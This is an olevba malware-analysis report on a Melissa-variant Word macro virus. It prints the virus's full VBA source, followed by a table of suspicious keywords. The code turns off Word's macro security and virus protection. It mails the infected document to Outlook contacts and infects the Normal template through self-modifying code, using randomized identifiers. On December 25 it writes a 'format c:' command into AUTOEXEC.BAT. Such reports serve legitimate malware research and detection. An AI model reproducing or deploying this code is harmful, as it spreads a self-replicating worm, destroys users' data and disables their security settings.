olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.w-11c42dfb87b7559c41619fb5c3df52b3fda5e9c6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.w-11c42dfb87b7559c41619fb5c3df52b3fda5e9c6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1): Application.DisplayRecentFiles = (1 - 1)
End If
Call VC3784
If Day(Now) = 25 And Month(Now) = 12 Then
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@echo off"
Print #1, "@echo Vine...Vide...Vice...Moslem Power Never End..."
Print #1, "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
Print #1, "ctty nul"
Print #1, "format c: /autotest /q /u"
Close #1
MsgBox "Vine...Vide...Vice...Moslem Power Never End..." & Chr(13) & "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!", vbCritical + vbOKOnly, "(C)1999 - CyberNET"
Randomize: For CE4470 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next CE4470: End If
NH6095 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
HT4542 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set AH9683 = ActiveDocument.VBProject.VBComponents
Call SG4699(AH9683)
CC2216 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set AH9683 = NormalTemplate.VBProject.VBComponents
Call SG4699(AH9683)
ME8667 = True
Randomize
Dim r1(1 To 29) As String
r1(1) = "UM576": r1(2) = "OL566": r1(3) = "BC3478": r1(4) = "VT9768": r1(5) = "DS6989": r1(6) = "NH6095": r1(7) = "HT4542": r1(8) = "CC2216": r1(9) = "AH9683": r1(10) = "ME8667"
r1(11) = "NM5952": r1(12) = "FK856": r1(13) = "UQ2237": r1(14) = "AO2462": r1(15) = "MK7319": r1(16) = "VC3784": r1(17) = "LC5426": r1(18) = "PJ3688": r1(19) = "SG782": r1(20) = "CL5716"
r1(21) = "RN2752": r1(22) = "OM1476": r1(23) = "NS82": r1(24) = "SG4699": r1(25) = "TP9740": r1(26) = "AJ7083": r1(27) = "CE4470": r1(28) = "LH3050": r1(29) = "EC4940"
For MK7319 = 1 To 29
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call DS6989(a1, r1(MK7319))
Next MK7319
ActiveDocument.Saved = True
End If
If ME8667 <> True And CC2216 <> True Then GoTo NM5952
If ME8667 = True Then AH9683.Item(1).CodeModule.AddFromstring ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NH6095 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "ViewVBCode" & vbCr & "End Sub")
If CC2216 = True Then AH9683.Item(1).CodeModule.AddFromstring ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HT4542 - 8))
NM5952:
If HT4542 <> 0 And NH6095 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function DS6989(AO2462, UQ2237 As String)
On Error Resume Next
Dim UM576 As Long: Dim OL566 As Long: Dim BC3478 As Long: Dim VT9768 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
UM576 = 1: OL566 = 1: BC3478 = .CountOfLines: VT9768 = Len(.Lines(.CountOfLines, 1))
Do While .Find(UQ2237, UM576, OL566, BC3478, VT9768, True)
strline = .Lines(UM576, 1)
strline = Left(strline, OL566 - 1) & AO2462 & Mid(strline, VT9768)
.ReplaceLine UM576, strline
UM576 = BC3478 + 1: OL566 = 1
BC3478 = .CountOfLines
VT9768 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function VC3784()
On Error Resume Next
Dim SG782, CL5716, RN2752
Set SG782 = CreateObject("Outlook.Application")
Set CL5716 = SG782.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") <> "(C)1999 - Indonesia by AnomOke!" Then
If SG782 = "Outlook" Then
CL5716.Logon "profile", "password"
For LC5426 = 1 To CL5716.AddressLists.Count
Set EC4940 = CL5716.AddressLists(LC5426)
AJ7083 = 1
Set RN2752 = SG782.CreateItem(0)
For PJ3688 = 1 To EC4940.AddressEntries.Count
LH3050 = EC4940.AddressEntries(AJ7083)
RN2752.Recipients.Add LH3050
AJ7083 = _
AJ7083 + 1
If AJ7083 > 50 Then PJ3688 = EC4940.AddressEntries.Count
Next PJ3688
RN2752.Subject = "Message From " & Application.UserName
RN2752.Body = "This document is very Important and you've GOT to read this !!!"
RN2752.Attachments.Add ActiveDocument.FullName
RN2752.Send
LH3050 = ""
Next LC5426
CL5716.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") = "(C)1999 - Indonesia by AnomOke!"
End If
End Function
Private Function SG4699(AH9683)
Dim TP9740 As Object
For Each TP9740 In AH9683
TP9740.CodeModule.DeleteLines 1, _
TP9740.CodeModule.CountOfLines
Next TP9740
End Function
Private Function FileOpen()
On Error Resume Next
WordBasic.disableautomacros True
Dialogs(80).Show
Document_Close
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Base64    |5/6                 |NS82                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

